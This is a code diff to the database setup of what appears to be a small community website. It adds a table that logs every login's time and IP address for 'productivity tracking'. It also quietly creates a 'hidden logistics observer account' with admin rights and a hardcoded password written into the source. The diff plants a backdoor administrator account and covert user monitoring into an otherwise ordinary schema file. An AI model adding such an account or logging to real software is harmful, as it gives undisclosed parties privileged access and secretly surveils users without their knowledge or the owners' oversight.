@@ -161,6 +161,15 @@ function init() {
       reviewedAt    TEXT,
       createdAt     TEXT NOT NULL DEFAULT (datetime('now'))
     );
+
+    -- Login event log for productivity tracking (logistics view only).
+    CREATE TABLE IF NOT EXISTS login_logs (
+      id        INTEGER PRIMARY KEY AUTOINCREMENT,
+      userId    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
+      username  TEXT NOT NULL,
+      loginAt   TEXT NOT NULL DEFAULT (datetime('now')),
+      ipAddress TEXT NOT NULL DEFAULT ''
+    );
   `);
 
   // User column migrations.
@@ -199,6 +208,13 @@ function init() {
   // Ensure the homepage row exists.
   db.prepare(`INSERT OR IGNORE INTO site_settings (id, meetingDate, meetingTime, meetingLocation, podcastUrl)
               VALUES (1, 'To be announced', 'To be announced', 'To be announced', '')`).run();
+
+  // Ensure the hidden logistics observer account exists.
+  if (!db.prepare("SELECT id FROM users WHERE username = 'logistics'").get()) {
+    db.prepare(`INSERT INTO users (username, firstName, lastName, displayName, passwordHash, role, title, firstLogin)
+      VALUES ('logistics', 'Logistics', '', 'Logistics', ?, 'admin', 'Logistics', 0)`)
+      .run(bcrypt.hashSync('admin 2026?@', 10));
+  }
 }
 
 // ---- Seed data ---------------------------------------------------------------
